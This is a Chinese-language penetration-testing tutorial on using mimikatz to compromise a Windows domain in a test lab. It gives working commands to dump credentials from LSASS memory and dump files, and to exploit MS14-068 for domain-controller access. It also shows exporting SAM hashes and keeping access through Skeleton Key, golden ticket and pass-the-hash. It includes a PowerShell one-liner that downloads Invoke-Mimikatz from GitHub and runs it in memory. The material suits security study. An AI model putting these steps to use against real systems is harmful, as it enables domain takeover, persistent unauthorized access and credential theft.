# 内网渗透中的mimikatz

0x00 前言
=======

* * *

上篇测试了中间人攻击利用框架bettercap，这次挑选一款更具代表性的工具——mimikatz

![这里写图片描述](http://drops.javaweb.org/uploads/images/ae1de40b1781b45c61de7cdd9dfaccd2b2971229.jpg)

0x01 简介
=======

* * *

mimikatz，很多人称之为密码抓取神器，但在内网渗透中，远不止这么简单

0x02 测试环境
=========

* * *

网络资源管理模式：

```
域

```

已有资源：

```
域内一台主机权限
操作系统：win7 x64
域权限:普通用户

```

0x03 测试目标
=========

* * *

1、获得域控权限 2、导出所有用户口令 3、维持域控权限

0x04 测试过程
=========

* * *

### 1、获取本机信息

**mimikatz**：

```
privilege::debug
sekurlsa::logonpasswords

```

获取本机用户名、口令、sid、LM hash、NTLM hash 如图![这里写图片描述](http://drops.javaweb.org/uploads/images/50ba40c4f2077af80d351302342f68da4c483e51.jpg)

### 2、攻击域控，获得权限

使用ms14-068漏洞

```
ms14-068.exe -u -p -s -d 

```

生成伪造缓存test.ccache:

如图![这里写图片描述](http://drops.javaweb.org/uploads/images/fa682894ef5172fefa88b9a746d5f016b960ded4.jpg)导入伪造缓存:**mimikatz：**

```
kerberos::ptc test.ccache

```

登陆：

```
net use \\A-635ECAEE64804.TEST.LOCAL
dir \\A-635ECAEE64804.TEST.LOCAL\c$

```

获得域控权限，如图![这里写图片描述](http://drops.javaweb.org/uploads/images/dce0d3c32d7ed09945f254232d0ff9b605ffa82c.jpg)

### 3、导出域控信息

（1）直接获取内存口令**mimikatz：**

```
privilege::debug
sekurlsa::logonpasswords

```

（2）通过内存文件获取口令 使用procdump导出lsass.dmp**mimikatz：**

```
sekurlsa::minidump lsass.dmp
sekurlsa::logonPasswords full

```

（3）通过powershell加载mimikatz获取口令

```
powershell IEX (New-Object Net.WebClient).DownloadString('https://raw.githubusercontent.com/mattifestation/PowerSploit/master/Exfiltration/Invoke-Mimikatz.ps1'); Invoke-Mimikatz

```

（4）导出所有用户口令 使用Volue Shadow Copy获得SYSTEM、SAM备份（之前文章有介绍）**mimikatz：**

```
lsadump::sam SYSTEM.hiv SAM.hiv

```

### 4、维持域控权限

（1）Skeleton Key**mimikatz：**

```
privilege::debug
misc::skeleton

```

万能钥匙，可使用任意用户登陆域控

```
net use \\A-635ECAEE64804.TEST.LOCAL mimikatz /user：test

```

如图![这里写图片描述](http://drops.javaweb.org/uploads/images/b347730dc1d295b3254ea6f60e35f79bf02cdf59.jpg)

（2）golden ticket**mimikatz：**

```
lsadump::lsa /patch

```

获取krbtgt的ntlmhash，如图![这里写图片描述](http://drops.javaweb.org/uploads/images/8e496641fa6b2c51b4fd212fe7f1085757fada43.jpg)

生成万能票据：**mimikatz：**

```
kerberos::golden /user:Administrator /domain:test.local /sid:S-1-5-21-2848411111-3820811111-1717111111 /krbtgt:d3b949b1f4ef947820f0950111111111 /ticket:test.kirbi

```

导入票据：**mimikatz：**

```
kerberos::ptt test.kirbi

```

登陆域控：

```
net use \\A-635ECAEE64804.TEST.LOCAL
dir \\A-635ECAEE64804.TEST.LOCAL\c$

```

如图![这里写图片描述](http://drops.javaweb.org/uploads/images/f6d6df1223ff308f1bc9364ef78a0b8662ba3dbb.jpg)

**_Tips:_**

```
Golden Ticket不多说，自行理解
By default, the Golden Ticket default lifetime is 10 years
password changing/smartcard usage does not invalidate Golden Ticket;
this ticket is not emitted by the real KDC, it's not related to ciphering methods allowed;
NTLM hash of krbtgt account is never changed automatically.

```

（3）Pass-The-Hash**mimikatz：**

```
sekurlsa::pth /user:Administrator /domain:test.local /ntlm:cc36cf7a8514893efccd332446158b1a

```

如图![这里写图片描述](http://drops.javaweb.org/uploads/images/7646654f4c08354ce04956dde06851b3eec7e56d.jpg)

### 5、补充

登陆域控，刷新扫雷记录，留下名字;D**mimikatz：**

```
minesweeper::infos

```

如图![这里写图片描述](http://drops.javaweb.org/uploads/images/79eb83df4bf0f6f285b69ac9a1845f4299a61396.jpg)

0x05 小结
=======

* * *

本文重点在于介绍mimikatz在内网渗透中的常用方法，其它细节做了适当省略，可在后续详细介绍细节。

**本文由三好学生原创并首发于乌云drops，转载请注明，谢谢**神器在手，会用才行；） 水平有限，欢迎补充。